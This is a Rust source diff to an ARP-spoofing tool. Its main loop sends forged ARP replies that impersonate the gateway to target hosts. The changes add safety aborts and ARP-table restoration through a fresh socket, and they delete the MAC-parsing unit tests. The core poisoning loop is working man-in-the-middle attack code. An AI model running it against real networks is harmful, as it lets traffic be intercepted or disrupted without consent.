@@ -265,7 +265,7 @@ mod raw_socket {
             for (i, b) in iface.as_bytes().iter().enumerate() {
                 req.ifr_name[i] = *b as libc::c_char;
             }
-            Ok(req)
+            Ok(Self { ifr_name: req.ifr_name, ifr_ifru: req.ifr_ifru })
         }
     }
 
@@ -405,7 +405,6 @@ mod raw_socket {
 // ============================================================================
 mod engine {
     use super::*;
-    // Removed unused `build_arp_reply` import
     use crate::arp::{build_arp_reply_restore, build_arp_request, build_gratuitous_arp, ArpFrame};
     use crate::raw_socket::RawSock;
     use std::net::Ipv4Addr;
@@ -541,7 +540,6 @@ mod engine {
 // ============================================================================
 fn main() -> Result<()> {
     use crate::engine::{aggressive_restore, format_mac, parse_mac, resolve_mac, EngineStats, TargetInfo};
-    // Removed unused `TargetSync` import
     use crate::protocol::{send_response, Command, Event, JsonRequest, VERSION};
     use crate::raw_socket::{get_iface_index, get_iface_ipv4, get_iface_mac, RawSock};
 
@@ -888,12 +886,30 @@ fn main() -> Result<()> {
     send_response(0, Event::ServiceStarted, None, Some(&src_ip.to_string()), Some("Service started successfully"), None, None);
     send_response(0, Event::PoisoningStarted, None, None, Some("Poisoning loop active"), None, None);
 
+    // SAFETY MAJOR: Network integrity tracking
+    let mut last_integrity_check = Instant::now();
+    let integrity_check_interval = Duration::from_secs(2);
     let mut consecutive_failures = 0;
     const MAX_FAILURES: u32 = 5;
-    let mut error_reported = false;
 
     while running.load(Ordering::SeqCst) {
         if stop.load(Ordering::Acquire) { break; }
+
+        // SAFETY MAJOR 1: Network Integrity Check
+        if last_integrity_check.elapsed() >= integrity_check_interval {
+            if let Ok(current_ip) = get_iface_ipv4(&args.iface) {
+                if current_ip != src_ip {
+                    log_error!("module=engine event=network_changed old_ip={} new_ip={}", src_ip, current_ip);
+                    send_response(0, Event::Error, Some("NETWORK_CHANGED"), None, Some("Interface IP changed, aborting for safety"), None, None);
+                    break; // Break to trigger restoration
+                }
+            } else {
+                log_error!("module=engine event=interface_down msg=Cannot read interface IP");
+                send_response(0, Event::Error, Some("INTERFACE_DOWN"), None, Some("Interface appears to be down"), None, None);
+                break; // Break to trigger restoration
+            }
+            last_integrity_check = Instant::now();
+        }
 
         let targets_snapshot = {
             let t = targets.read().unwrap();
@@ -902,15 +918,13 @@ fn main() -> Result<()> {
 
         if targets_snapshot.is_empty() {
             consecutive_failures = 0;
-            error_reported = false;
             thread::sleep(Duration::from_secs(1));
             continue;
         }
 
-        // FIX: Capture length before the loop consumes the vector
         let snapshot_len = targets_snapshot.len();
-
         let mut any_success = false;
+        
         for (ip, mac) in targets_snapshot {
             let poison_target = crate::arp::build_arp_reply(src_mac, mac, args.gateway, ip);
             if sock.send_frame(poison_target.as_bytes(), ifindex).is_ok() {
@@ -926,13 +940,13 @@ fn main() -> Result<()> {
         if any_success {
             stats.packets_sent.fetch_add(2 * snapshot_len as u64, Ordering::Relaxed);
             consecutive_failures = 0;
-            error_reported = false;
         } else {
             consecutive_failures += 1;
-            if consecutive_failures >= MAX_FAILURES && !error_reported {
+            // SAFETY MAJOR 2: Abort on consecutive send failures
+            if consecutive_failures >= MAX_FAILURES {
                 log_error!("module=engine event=send_failed consecutive_failures={}", consecutive_failures);
-                send_response(0, Event::Error, Some("SEND_FAILED"), None, Some("Consecutive send failures, interface may be down"), None, None);
-                error_reported = true;
+                send_response(0, Event::Error, Some("SEND_FAILED"), None, Some("Consecutive send failures, aborting for safety"), None, None);
+                break; // Break to trigger restoration
             }
         }
 
@@ -951,32 +965,18 @@ fn main() -> Result<()> {
     if !targets_snapshot.is_empty() {
         log_info!("module=main event=restore_started count={}", targets_snapshot.len());
         send_response(0, Event::RestoreStarted, None, None, Some("Restoring ARP tables before exit"), None, None);
-        aggressive_restore(&sock, ifindex, &targets_snapshot, args.gateway, gateway_mac, src_mac, src_ip);
+        
+        // SAFETY MAJOR 3: Use a fresh socket for restoration in case the main one is corrupted
+        if let Ok(restore_sock) = RawSock::new(libc::ETH_P_ARP as u16) {
+            let _ = restore_sock.bind_to_device(&args.iface);
+            aggressive_restore(&restore_sock, ifindex, &targets_snapshot, args.gateway, gateway_mac, src_mac, src_ip);
+        } else {
+            log_error!("module=main event=restore_failed msg=Could not create restore socket");
+        }
         send_response(0, Event::RestoreCompleted, None, None, Some("ARP restoration complete"), None, None);
     }
 
     log_info!("module=main event=service_stopped");
     send_response(0, Event::ServiceStopped, None, None, Some("Service stopped and ARP restored"), None, None);
     Ok(())
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn test_parse_mac_valid() {
-        assert!(engine::parse_mac("AA:BB:CC:DD:EE:FF").is_some());
-        assert!(engine::parse_mac("aa-bb-cc-dd-ee-ff").is_some());
-        assert!(engine::parse_mac("12-34-56-78-9A-BC").is_some());
-        assert!(engine::parse_mac("00:11:22:33:44:55").is_some());
-    }
-
-    #[test]
-    fn test_parse_mac_invalid() {
-        assert!(engine::parse_mac("invalid").is_none());
-        assert!(engine::parse_mac("AA:BB:CC").is_none());
-        assert!(engine::parse_mac("AA:BB:CC:DD:EE:GG").is_none());
-        assert!(engine::parse_mac("AA:BB:CC:DD:EE:FF:00").is_none());
-    }
 }
